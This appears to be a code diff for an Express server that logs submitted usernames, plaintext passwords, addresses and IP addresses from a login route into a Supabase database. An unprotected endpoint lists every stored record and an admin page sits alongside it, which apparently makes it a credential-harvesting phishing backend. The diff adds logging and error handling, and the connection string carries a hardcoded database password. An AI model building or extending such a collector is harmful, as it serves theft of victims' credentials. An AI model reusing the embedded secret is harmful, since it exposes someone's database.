@@ -6,11 +6,13 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection
+// === YOUR SUPABASE CONNECTION ===
 const pool = new Pool({
     connectionString: 'postgresql://postgres:[ibnaira1999@]@db.bjyhgxqromtghuvnozog.supabase.co:5432/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
+console.log("Attempting to connect to Supabase...");
 
 // Create table
 pool.query(`CREATE TABLE IF NOT EXISTS records (
@@ -21,14 +23,16 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     address TEXT,
     ip TEXT,
     timestamp TEXT
-)`).catch(err => console.log("Table error:", err));
+)`).then(() => console.log("✅ Table ready"))
+  .catch(err => console.error("❌ Table Error:", err.message));
 
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
-    );
+    ).then(() => console.log(`✅ SAVED: ${type}`))
+     .catch(err => console.error("❌ Save Failed:", err.message));
 }
 
 // Routes
@@ -49,8 +53,13 @@ app.post('/api/login', (req, res) => {
 });
 
 app.get('/api/records', async (req, res) => {
-    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
-    res.json(result.rows);
+    try {
+        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
+        res.json(result.rows);
+    } catch (err) {
+        console.error("Query Error:", err.message);
+        res.json([]);
+    }
 });
 
 app.get('/admin', (req, res) => {
@@ -64,5 +73,5 @@ app.post('/api/clear', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running with Supabase Permanent Storage`);
+    console.log(`🚀 Server running`);
 });
